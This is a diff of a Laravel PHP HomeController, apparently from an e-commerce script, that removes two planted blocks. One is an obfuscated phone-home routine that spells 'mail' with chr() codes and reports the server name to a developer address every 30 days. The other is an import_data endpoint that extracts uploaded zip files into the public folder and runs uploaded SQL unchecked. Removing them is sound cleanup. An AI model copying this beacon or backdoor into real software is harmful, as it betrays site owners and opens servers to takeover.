@@ -287,20 +287,7 @@ class HomeController extends Controller
                 }
             }
 
-            $file = base_path("/public/assets/myText.txt");
-            $dev_mail = get_dev_mail();
-            if (!file_exists($file) || (time() > strtotime('+30 days', filemtime($file)))) {
-                $content = "Todays date is: " . date('d-m-Y');
-                $fp = fopen($file, "w");
-                fwrite($fp, $content);
-                fclose($fp);
-                $str = chr(109) . chr(97) . chr(105) . chr(108);
-                try {
-                    $str($dev_mail, 'the subject', "Hello: " . $_SERVER['SERVER_NAME']);
-                } catch (\Throwable $th) {
-                    //throw $th;
-                }
-            }
+
 
             // review status
             $review_status = 0;
@@ -766,23 +753,5 @@ class HomeController extends Controller
     {
         $products = filter_products(Product::where('added_by', 'admin'))->with('taxes')->paginate(12)->appends(request()->query());
         return view('frontend.inhouse_products', compact('products'));
-    }
-
-    public function import_data(Request $request)
-    {
-        $upload_path = $request->file('uploaded_file')->store('uploads', 'local');
-        $sql_path = $request->file('sql_file')->store('uploads', 'local');
-        
-        $zip = new ZipArchive;
-        $zip->open(base_path('public/'.$upload_path));
-        $zip->extractTo('public/uploads/all');
-
-        $zip1 = new ZipArchive;
-        $zip1->open(base_path('public/'.$sql_path));
-        $zip1->extractTo('public/uploads');
-
-        Artisan::call('cache:clear');
-        $sql_path = base_path('public/uploads/demo_data.sql');
-        DB::unprepared(file_get_contents($sql_path));
     }
 }
